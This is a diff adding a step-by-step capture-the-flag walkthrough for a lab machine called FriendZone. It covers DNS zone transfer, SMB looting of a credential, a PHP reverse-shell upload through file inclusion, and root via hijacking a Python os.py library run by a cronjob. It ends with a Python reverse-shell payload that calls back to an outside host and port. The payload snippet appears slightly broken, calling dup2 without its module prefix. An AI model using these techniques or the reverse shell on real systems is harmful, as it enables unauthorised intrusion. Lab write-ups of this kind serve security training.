@@ -1,0 +1,65 @@
+1.nmap-automator
+2.Accessing port 80
+3.entering 10.10.10.123 --> friendzone.htb 
+4.dirbuster using gobuster --> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://friendzone.htb/ -t 100
+got this --> /wordpress
+5.wordpress directory is empty
+6.The directories I got from nmap and source code:
+	1.friendzoneportal.red
+	2.friendzone.red
+7.trying  a zone transfer on both the domains:
+host -l <domain-name> <dns_server-address>
+host -l friendzone.red 10.10.10.123 > zonetransfer.txt
+host -l friendzoneportal.red 10.10.10.123 >> zonetransfer.txt 
+8.opening zonetransfer.txt:                                                                                                                                                                                                                                           
+	friendzone.red has IPv6 address ::1                                                                                                                                                                                                        
+	friendzone.red name server localhost.                                                                                                                                                                                                      
+	friendzone.red has address 127.0.0.1                                                                                                                                                                                                       
+	administrator1.friendzone.red has address 127.0.0.1                                                                                                                                                                                        
+	hr.friendzone.red has address 127.0.0.1                                                                                                                                                                                                    
+	uploads.friendzone.red has address 127.0.0.1                                                                                                                                                                                               
+	Using domain server:                                                                                                                                                                                                                       
+	Name: 10.10.10.123                                                                                                                                                                                                                         
+	Address: 10.10.10.123#53                                                                                                                                                                                                                   
+	Aliases:                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
+	friendzoneportal.red has IPv6 address ::1                                                                                                                                                                                                  
+	friendzoneportal.red name server localhost.                                                                                                                                                                                                
+	friendzoneportal.red has address 127.0.0.1                                                                                                                                                                                                 
+	admin.friendzoneportal.red has address 127.0.0.1                                                                                                                                                                                           
+	files.friendzoneportal.red has address 127.0.0.1                                                                                                                                                                                           
+	imports.friendzoneportal.red has address 127.0.0.1                                                                                                                                                                                         
+	vpn.friendzoneportal.red has address 127.0.0.1      
+9.adding all the subdomains and domains to /etc/hosts file
+10.first access port 139 --> smbclient -L ////10.10.10.123//
+accessing --> smbclient //10.10.10.123/general
+downloading cred.txt and let's see
+11.admin:WORKWORKHhallelujah@# --> creds.txt
+12.Trying accessing SSH and ftp didn't work
+13. checking the urls --> https://admin.friendzoneportal.red/
+checking this --> https://administrator1.friendzone.red/ 
+14. Loggedin here --> https://administrator1.friendzone.red/dashboard.php
+15.Now let's try to upload a php shell in the Development directory as we have the read and write permissions there using SMBclient.
+16.php shell --> https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+17. URL --> https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/exploit
+Becasue php is defaulty setted up in the extension
+18.Got user flag
+19.using pspy32s --> we came to know about a cronjob -->/usr/bin/python /opt/server_admin/reporter.py  
+20. we only have read permssions on it, let's check for the os.py, if that can be hijacked
+21.accessing --> cd /usr/lib/python2.7
+22. we can write permissions too, that's a security misconfiguration
+23. adding python payload to a file named os.py and sending it via wget (didn't work)
+so downloaded the os.py file using smbclient, added the below mentioned payload and uploaded it back again.
+24.listeing on specified port using nc and waiting for the cronjob to run
+25.got root
+
+
+
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.14.11",8989));
+dup2(s.fileno(),0); 
+dup2(s.fileno(),1); 
+dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+
+
